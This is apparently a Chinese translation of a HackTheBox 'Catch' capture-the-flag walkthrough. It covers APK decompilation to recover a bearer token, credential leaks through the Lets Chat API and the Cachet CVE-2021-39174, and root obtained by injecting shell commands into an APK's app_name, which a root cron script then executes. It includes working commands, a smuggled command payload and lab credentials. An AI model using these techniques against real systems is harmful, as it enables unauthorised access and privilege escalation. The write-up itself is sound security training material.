# 从黑客盒子捕捉-详细演练

> 原文：<https://infosecwriteups.com/catch-from-hackthebox-detailed-walkthrough-d0ad7cf318b3?source=collection_archive---------1----------------------->

## 向您展示完成盒子所需的所有工具和技术。

# 机器信息

![](img/c275c1844cf5803c9554322b832ab048.png)

从箱子里抓鱼

Catch 在 HackTheBox 上被评为中型机。这个 Linux 盒子有许多开放端口，但是我们从一个 APK 开始，我们下载并反编译它以找到一个不记名令牌。这样，我们就可以在 Cachet 中找到凭据，这样我们就可以进行访问，允许使用已知的 CVE 来检索更多凭据。这些为我们提供了对 SSH 的访问，在枚举操作系统后，我们发现了一个不安全的脚本，我们可以利用它来找到 root。

所需的技能是枚举和使用已知的利用。学到的技能是反编译和操纵 APK 文件。

[](https://www.hackthebox.com/home/machines/profile/450) [## 捕捉—破解盒子::渗透测试实验室

### 登录 Hack The Box 平台，让您的笔测试和网络安全技能更上一层楼！

www.hackthebox.com](https://www.hackthebox.com/home/machines/profile/450) 

# 初步侦察

像往常一样，让我们从 Nmap 开始:

![](img/7228a69b39482b87deb55a749f484cac.png)

从黑盒子中捕获的 Nmap 扫描

我们找到几个开放的端口，让我们像往常一样从 80 开始:

![](img/cd1fa89b0ecd219b3f0ad7e0d02a0e2e.png)

Catch 网站

这是一个静态网站，提到了 Lets-Chat 和 Gitea 集成，但没有什么明显的发现。

# 下载 APK

有一个“现在下载”按钮给我们一个 apk 文件。让我们抓住这个:

```
┌──(root㉿kali)-[~/htb/catch]
└─# wget http://catch.htb/catchv1.0.apk
--2022-04-21 22:25:51--  http://catch.htb/catchv1.0.apk
Resolving catch.htb (catch.htb)... 10.10.11.150
Connecting to catch.htb (catch.htb)|10.10.11.150|:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3356353 (3.2M) [application/vnd.android.package-archive]
Saving to: ‘catchv1.0.apk’
catchv1.0.apk  100%[=============>]   3.20M  3.51MB/s    in 0.9s    
2022-04-21 22:25:52 (3.51 MB/s) - ‘catchv1.0.apk’ saved [3356353/3356353]
```

# 吉特亚

这里没什么可看的了，让我们试试 nmap 之前找到的端口 3000:

![](img/d59326a40c8ed150fe6c4f712bd22e8e.png)

端口 3000 上的 Gitea 实例

这里我们发现了一个 Gitea 的安装版本，它就像是 GitHub 的一个自托管版本。环顾四周，这里也没有什么明显的，我找不到这个版本的漏洞。

# 让我们登录聊天

在 nmap 找到的下一个端口 5000 上:

![](img/a3d69540a7e47a1371de462147782f16.png)

让我们在 5000 端口上聊天

现在我们找到了一个安装了[let Chat](https://github.com/sdelements/lets-chat)的登录页面，这是一个为小团队提供的自托管聊天应用。

# 缓存登录

最后，让我们看看我们找到的最后一个端口 8000:

![](img/27055f20b0e029477346175392085489.png)

端口 8000 上的缓存登录页面

这是一个对本地安装的 [Cachet](https://cachethq.io/) 的登录，这是一个开源的状态页面系统。

# 反编译 APK

所以我们有很多事情要研究。我从头开始反编译我下载的 apk:

```
┌──(root㉿kali)-[~/htb/catch]
└─# apktool           
Command 'apktool' not found, but can be installed with:
apt install apktool
Do you want to install it? (N/y)y
apt install apktool
Reading package lists... Done
Building dependency tree... Done
Reading state information... Done
The following additional packages will be installed:
  aapt android-framework-res android-libaapt android-libandroidfw android-libbacktrace android-libbase android-libcutils android-liblog android-libunwind android-libutils android-libziparchive junit libantlr-java
  libantlr3-runtime-java libapache-pom-java libatinject-jsr330-api-java libcommons-cli-java libcommons-io-java libcommons-lang3-java libcommons-parent-java libguava-java libjsr305-java libsmali-java libstringtemplate-java
  libxmlunit-java libxpp3-java libyaml-snake-java
0 upgraded, 28 newly installed, 0 to remove and 151 not upgraded.
Need to get 21.8 MB of archives.
After this operation, 58.3 MB of additional disk space will be used.
<SNIP>
Setting up android-libbacktrace (1:10.0.0+r36-10) ...
Setting up libcommons-io-java (2.11.0-2) ...
Setting up android-libutils (1:10.0.0+r36-10) ...
Setting up android-libandroidfw:amd64 (1:10.0.0+r36-3) ...
Setting up android-libaapt:amd64 (1:10.0.0+r36-3) ...
Setting up aapt (1:10.0.0+r36-3) ...
Setting up apktool (2.5.0+dfsg.1-2) ...
```

Apktool 很好，使用起来很简单。它没有安装，但在 Kali 库中，所以在它完成后，我们可以使用反编译 apk:

```
┌──(root㉿kali)-[~/htb/catch]
└─# apktool d catchv1.0.apk 
I: Using Apktool 2.5.0-dirty on catchv1.0.apk
I: Loading resource table...
I: Decoding AndroidManifest.xml with resources...
I: Loading resource table from file: /root/.local/share/apktool/framework/1.apk
I: Regular manifest package...
I: Decoding file-resources...
I: Decoding values */* XMLs...
I: Baksmaling classes.dex...
I: Copying assets and libs...
I: Copying unknown files...
I: Copying original files...
```

现在我们有一个文件夹，里面有 apk 的所有文件。经过一番搜索，我终于找到了这个:

![](img/4545826bb057a109b039428ec3a293c9.png)

反编译 apk 中标记的 Grep

# 列举让我们聊天

这是一个名为 strings.xml 的文件，带有 Gitea 的标记。“让我们聊天”是我们想要的，但它花了我相当多的工作。首先，我找到了[这个](https://github.com/sdelements/lets-chat/issues/436)和[这个](https://github.com/taigaio/taiga-contrib-letschat/issues/2)，这有助于如何使用一个不记名令牌，就像我们刚刚找到的那个，并使用 curl 与 Lets Chat API 进行交互。

我还找到了[这个](https://github.com/sdelements/lets-chat/wiki/API)，它向你展示了如何使用 API 来检索数据。首先我看了看账户:

```
┌──(root㉿kali)-[~/htb/catch/catchv1.0]
└─# curl -s -X GET "http://catch.htb:5000/account/" -H "Authorization: bearer NjFiODZhZWFkOTg0ZTI0NTEwMzZlYjE2OmQ1ODg0NjhmZjhiYWU0NDYzNzlhNTdmYTJiNGU2M2EyMzY4MjI0MzM2YjU5NDljNQ==" | json_pp                              
{
   "avatar" : "e2b5310ec47bba317c5f1b5889e96f04",
   "displayName" : "Admin",
   "firstName" : "Administrator",
   "id" : "61b86aead984e2451036eb16",
   "lastName" : "NA",
   "openRooms" : [
      "61b86b28d984e2451036eb17",
      "61b86b3fd984e2451036eb18",
      "61b8708efe190b466d476bfb"
   ],
   "username" : "admin"
}
```

这显示了一个开放房间的列表。接下来我看了列表上的第一个房间:

```
┌──(root㉿kali)-[~/htb/catch/catchv1.0]
└─# curl -s -X GET "http://catch.htb:5000/rooms/61b86b28d984e2451036eb17" -H "Authorization: bearer NjFiODZhZWFkOTg0ZTI0NTEwMzZlYjE2OmQ1ODg0NjhmZjhiYWU0NDYzNzlhNTdmYTJiNGU2M2EyMzY4MjI0MzM2YjU5NDljNQ==" | json_pp 
{
   "created" : "2021-12-14T10:00:08.384Z",
   "description" : "Cachet Updates and Maintenance",
   "hasPassword" : false,
   "id" : "61b86b28d984e2451036eb17",
   "lastActive" : "2021-12-14T10:34:20.749Z",
   "name" : "Status",
   "owner" : "61b86aead984e2451036eb16",
   "participants" : [],
   "private" : false,
   "slug" : "status"
}
```

没有太大帮助，尽管它提到了我们之前在端口 8000 上发现的 Cachet。再次查看文档，您可以列出一个房间中的所有邮件，让我们这样做:

```
┌──(root㉿kali)-[~/htb/catch/catchv1.0]
└─# curl -s -X GET "http://catch.htb:5000/rooms/61b86b28d984e2451036eb17/messages" -H "Authorization: bearer NjFiODZhZWFkOTg0ZTI0NTEwMzZlYjE2OmQ1ODg0NjhmZjhiYWU0NDYzNzlhNTdmYTJiNGU2M2EyMzY4MjI0MzM2YjU5NDljNQ==" | json_pp
[
<SNIP>
   {
      "id" : "61b8702dfe190b466d476bfa",
      "owner" : "61b86f15fe190b466d476bf5",
      "posted" : "2021-12-14T10:21:33.859Z",
      "room" : "61b86b28d984e2451036eb17",
      "text" : "Here are the credentials `john :  E}V!mywu_69T4C}W`"
   },
<SNIP>
]
```

有几条信息，但这条很有趣。

# 作为 John 的 Cachet 访问

让我们在之前找到的登录页面上尝试一下:

![](img/05b8f5352f30970ccfc997f521375ef3.png)

用找到的凭据缓存登录

它成功了，我们进入了:

![](img/3b061a33fb80c74e7271c460f912be26.png)

纪念印仪表板

# CVE-2021–39174

我不知道如何使用这个。在设置页面上，它告诉我们版本是 2.4.0-dev。搜索漏洞会将这个带到顶部。请看 CVE-2021–39174 上的一节，它显示了可以通过嵌套变量泄漏配置细节。也有视频，但是很容易做。进入设置和邮件，开始打嗝听音，点击保存按钮:

![](img/c780179a33ced9f0e8b727ec4a2323ed.png)

缓存邮件设置

切换到 Burp 以查看拦截的请求:

![](img/d44c57ed1885eee6f435af7d04c496ae.png)

拦截保存请求

将配置[邮件驱动程序]部分从 smtp 更改为$ {数据库用户名}，然后单击转发:

![](img/5bb01f87406acee5deee0fe074111ef5.png)

转发前更改发布请求

如果您收到另一个回复，请再次点按“转发”,然后关闭“拦截”并切换回网站:

![](img/891e72f2c0c89d9ec1b41b9545f7ad18.png)

门户上的更新成功

我们看到消息 Awesome 表示设置已更新。现在点击测试并确认:

![](img/6305232151b2f222b8fdd18b4c59a91c.png)

缓存漏洞的错误消息

这篇文章建议我不要看到这个错误屏幕，但是在搜索了一些日志之后，我们发现泄漏是成功的:

![](img/5e98099555c2576af994936e7c02be28.png)

可以在日志中看到数据泄漏

DB_USERNAME 是 Will。现在重复上述拦截保存在打嗝，设置配置[邮件 _ 驱动程序]为$ {数据库 _ 密码}，转发在打嗝，然后点击网站上的测试。查看日志，我们现在有了密码:

![](img/7808c08b90d9a79c5f0d020fd638d5de.png)

用户意愿的密码

# SSH 访问随心所欲

原来这些数据库凭证已经被 SSH 访问重用:

```
┌──(root㉿kali)-[~/htb/catch/catchv1.0]
└─# ssh will@catch.htb                                         
will@catch.htbs password: 
Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-104-generic x86_64)

  System information as of Fri 22 Apr 2022 04:37:04 PM UTC

Last login: Fri Apr 22 16:16:22 2022 from 10.10.14.101
will@catch:~$
```

# 用户标志

在继续之前，让我们抓住用户标志:

```
will@catch:~$ cat user.txt 
14c926ad5fee703cd6f26b9ec681ae23
```

# Pspy64

我尝试了 [LinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS) 但是什么也没找到，所以我用 [pspy](https://github.com/DominicBreuker/pspy) 查看了一下正在运行的进程。

首先获取最新版本并复制到包装盒中:

```
┌──(root㉿kali)-[~/htb/catch]
└─# wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64
--2022-04-22 17:41:08--  https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64
Resolving github.com (github.com)... 140.82.121.4
Connecting to github.com (github.com)|140.82.121.4|:443... connected.
HTTP request sent, awaiting response... 302 Found
<SNIP>
HTTP request sent, awaiting response... 200 OK
Length: 3078592 (2.9M) [application/octet-stream]
Saving to: ‘pspy64’
pspy64      100%[===============>]   2.94M  2.68MB/s    in 1.1s    
2022-04-22 17:41:10 (2.68 MB/s) - ‘pspy64’ saved [3078592/3078592]

┌──(root㉿kali)-[~/htb/catch]
└─# scp pspy64 will@catch.htb:~
will@catch.htbs password: 
pspy64                                                        100% 3006KB   1.7MB/s   00:01
```

现在切换回盒子并运行 pspy:

![](img/e27b03c4f185ea75ec960b6bd6ff457d.png)

Pspy 在盒子上看进程

# 代码审查

仅仅几秒钟后，我们看到 root 用户频繁运行一个名为 verify.sh 的 shell 脚本。让我们把它记下来，以便我们理解它。

第一部分使用 jarsigner 检查被访问的 apk 是否有有效的证书:

```
will@catch:~$ cat /opt/mdm/verify.sh
#!/bin/bash

###################
# Signature Check #
###################

sig_check() {
        jarsigner -verify "$1/$2" 2>/dev/null >/dev/null
        if [[ $? -eq 0 ]]; then
                echo '[+] Signature Check Passed'
        else
                echo '[!] Signature Check Failed. Invalid Certificate.'
                cleanup
                exit
        fi
}
```

本节检查 apk 是使用高于 18 的 SDK 版本编译的:

```
#######################
# Compatibility Check #
#######################

comp_check() {
        apktool d -s "$1/$2" -o $3 2>/dev/null >/dev/null
        COMPILE_SDK_VER=$(grep -oPm1 "(?<=compileSdkVersion=\")[^\"]+" "$PROCESS_BIN/AndroidManifest.xml")
        if [ -z "$COMPILE_SDK_VER" ]; then
                echo '[!] Failed to find target SDK version.'
                cleanup
                exit
        else
                if [ $COMPILE_SDK_VER -lt 18 ]; then
                        echo "[!] APK Doesn't meet the requirements"
                        cleanup
                        exit
                fi
        fi
}
```

本节使用/res/values/strings.xml 文件中设置的值检查应用程序名称:

```
####################
# Basic App Checks #
####################

app_check() {
        APP_NAME=$(grep -oPm1 "(?<=<string name=\"app_name\">)[^<]+" "$1/res/values/strings.xml")
        echo $APP_NAME
        if [[ $APP_NAME == *"Catch"* ]]; then
                echo -n $APP_NAME|xargs -I {} sh -c 'mkdir {}'
                mv "$3/$APK_NAME" "$2/$APP_NAME/$4"
        else
                echo "[!] App doesn't belong to Catch Global"
                cleanup
                exit
        fi
}
```

这是我们可以用来利用脚本的漏洞。您可以看到$APP_NAME 被设置为 strings.xml 文件中的一个值。它检查名称是否包含 Catch，然后执行 mkdir {}。这种不透明性允许我们通过用分号分隔命令来执行进一步的命令。

脚本的最后一部分设置了它将使用的文件夹，然后在 DROPBOX 文件夹中找到的每个 apk 上循环执行上面的函数:

```
###################
# MDM CheckerV1.0 #
###################

DROPBOX=/opt/mdm/apk_bin
IN_FOLDER=/root/mdm/apk_bin
OUT_FOLDER=/root/mdm/certified_apps
PROCESS_BIN=/root/mdm/process_bin

for IN_APK_NAME in $DROPBOX/*.apk;do
        OUT_APK_NAME="$(echo ${IN_APK_NAME##*/} | cut -d '.' -f1)_verified.apk"
        APK_NAME="$(openssl rand -hex 12).apk"
        if [[ -L "$IN_APK_NAME" ]]; then
                exit
        else
                mv "$IN_APK_NAME" "$IN_FOLDER/$APK_NAME"
        fi
        sig_check $IN_FOLDER $APK_NAME
        comp_check $IN_FOLDER $APK_NAME $PROCESS_BIN
        app_check $PROCESS_BIN $OUT_FOLDER $IN_FOLDER $OUT_APK_NAME
done
cleanup
```

所以我们需要做的总结是:

```
1\. Edit the strings.xml file on Kali for the catchv1.0.apk we decompiled earlier.
2\. Put the commands we want to execute separated by a ;.
3\. Compile the apk.
4\. Sign it.
5\. Upload to the box in folder /opt/mdm/apk_bin.
6\. Wait for glory.
```

# 利用 APK 漏洞

让我们开始吧。首先在您选择的编辑器中打开字符串文件:

```
┌──(root㉿kali)-[~/htb/catch/catchv1.0]
└─# nano res/values/strings.xml
```

寻找这条线:

```
<string name="app_name">Catch</string>
```

将其更改为以下内容，或者您希望以 root 用户身份执行的任何内容:

```
<string name="app_name">Catch999;cp /bin/bash /tmp/pencer; chmod +s /tmp/pencer</string>
```

在这里，我将 bash 复制为 root 用户，修改权限，这样我就可以按照用户的意愿执行以获得 root shell。

我使用了[这个](https://medium.com/@sandeepcirusanagunla/decompile-and-recompile-an-android-apk-using-apktool-3d84c2055a82)指南来帮助我编译和签署我们的 apk。

让我们使用 apktool 编译 apk:

```
┌──(root㉿kali)-[~/htb/catch]
└─# java -jar apktool_2.6.1.jar b -f -d /root/htb/catch/catchv1.0 -o /root/htb/catch/catch_pencer.apk                   
I: Using Apktool 2.6.1
I: Smaling smali folder into classes.dex...
I: Building resources...
I: Building apk file...
I: Copying unknown files/dir...
I: Built apk...
```

注意:这与 Kali repo 中 apktool 的最新版本不兼容。那个是 2.5，你需要 2.6.1 才能工作，所以如果需要，从[这里](https://apktool.en.lo4d.com/download)抓取。

现在我们需要签字。首先生成我们的密钥:

```
┌──(root㉿kali)-[~/htb/catch]
└─# keytool -genkey -v -keystore my-release-key.keystore -alias alias_name -keyalg RSA -keysize 2048 -validity 10000
Enter keystore password:  
Re-enter new password: 
What is your first and last name?
  [Unknown]:  1
What is the name of your organizational unit?
  [Unknown]:  1
What is the name of your organization?
  [Unknown]:  1
What is the name of your City or Locality?
  [Unknown]:  1
What is the name of your State or Province?
  [Unknown]:  1
What is the two-letter country code for this unit?
  [Unknown]:  us
Is CN=1, OU=1, O=1, L=1, ST=1, C=us correct?
  [no]:  yes
Generating 2,048 bit RSA key pair and self-signed certificate (SHA256withRSA) with a validity of 10,000 days
        for: CN=1, OU=1, O=1, L=1, ST=1, C=us
[Storing my-release-key.keystore]
```

然后用 jarsigner 签名，但是这里我遇到了一个问题，因为在 Kali 2022.1 中没有 jarsigner。检查我们可以看到我们安装了 java 11:

```
┌──(root㉿kali)-[~/htb/catch]
└─# update-alternatives --config java
There is 1 choice for the alternative java (providing /usr/bin/java).
Selection  Path                                   Priority   Status
--------------------------------------------------------------------
* 0    /usr/lib/jvm/java-11-openjdk-amd64/bin/java  1111   auto mode
  1    /usr/lib/jvm/java-11-openjdk-amd64/bin/java  1111 manual mode
```

jarsigner 仍然不在那里，所以我安装了 openjdk，它添加了更多的包:

```
┌──(root㉿kali)-[~/htb/catch]
└─# apt-get install openjdk-11-jdk
Reading package lists... Done
Building dependency tree... Done
Reading state information... Done
The following additional packages will be installed:
  libice-dev libpthread-stubs0-dev libsm-dev libx11-dev libxau-dev libxcb1-dev libxdmcp-dev libxt-dev openjdk-11-jdk-headless x11proto-dev xorg-sgml-doctools xtrans-dev
Suggested packages:
  libice-doc libsm-doc libx11-doc libxcb-doc libxt-doc openjdk-11-demo openjdk-11-source visualvm
The following NEW packages will be installed:
  libice-dev libpthread-stubs0-dev libsm-dev libx11-dev libxau-dev libxcb1-dev libxdmcp-dev libxt-dev openjdk-11-jdk openjdk-11-jdk-headless x11proto-dev xorg-sgml-doctools xtrans-dev
0 upgraded, 13 newly installed, 0 to remove and 151 not upgraded.
Need to get 223 MB of archives.
After this operation, 239 MB of additional disk space will be used.
Do you want to continue? [Y/n] y
<SNIP>
```

我设置了手动模式的替代模式:

```
┌──(root㉿kali)-[~/htb/catch]
└─# update-alternatives --config java
There is 1 choice for the alternative java (providing /usr/bin/java).
Selection  Path                                   Priority   Status
--------------------------------------------------------------------
  0    /usr/lib/jvm/java-11-openjdk-amd64/bin/java  1111   auto mode
* 1    /usr/lib/jvm/java-11-openjdk-amd64/bin/java  1111 manual mode
```

现在 jarsigner 可用了:

```
┌──(root㉿kali)-[~/htb/catch]
└─# jarsigner
Usage: jarsigner [options] jar-file alias
       jarsigner -verify [options] jar-file [alias...]

[-keystore <url>]           keystore location
<SNIP>
```

回到签署我们新建的 apk:

```
┌──(root㉿kali)-[~/htb/catch]
└─# jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore my-release-key.keystore catch_pencer.apk alias_name
Enter Passphrase for keystore: 
   adding: META-INF/MANIFEST.MF
   adding: META-INF/ALIAS_NA.SF
   adding: META-INF/ALIAS_NA.RSA
  signing: classes.dex
  signing: AndroidManifest.xml
  signing: resources.arsc
  signing: res/animator/mtrl_extended_fab_show_motion_spec.xml
<SNIP>
```

我们可以使用 SCPto 将文件复制到/opt/mdm/apk_bin 文件夹中:

```
┌──(root㉿kali)-[~/htb/catch]
└─# sshpass -p 's2#4Fg0_%3!' scp catch_pencer.apk will@catch.htb:/opt/mdm/apk_bin
```

切换回我们的 SSH 会话，因为用户将在机器上。等待几分钟，然后检查/tmp:

```
will@catch:~$ ll /tmp/pencer
-rwsr-sr-x 1 root root 1183448 Apr 23 14:28 /tmp/pencer*
```

# 根标志

我们的 bash 副本名为 pencer，权限已修改。现在让我们来看看根标志:

```
will@catch:~$ /tmp/pencer -p
pencer-5.0# whoami
root
pencer-5.0# cat /root/root.txt
340847d2ddd0d39864d988d72c4658ee
```

对我来说那是个相当棘手的盒子。我希望这个演练能帮助您度过难关。下次见。

如果你喜欢这篇文章，请给我一两个掌声(这是免费的！)

推特—[https://twitter.com/pencer_io](https://twitter.com/pencer_io)
网站— [https://pencer.io](https://pencer.io/)

*原载于 2022 年 7 月 23 日*[*https://pencer . io*](https://pencer.io/ctf/ctf-htb-catch/)*。*

*来自 Infosec 的报道:Infosec 上每天都会出现很多难以跟上的内容。* [***加入我们的每周简讯***](https://weekly.infosecwriteups.com/) *以 5 篇文章、4 个线程、3 个视频、2 个 Github Repos 和工具以及 1 个工作提醒的形式免费获取所有最新的 Infosec 趋势！*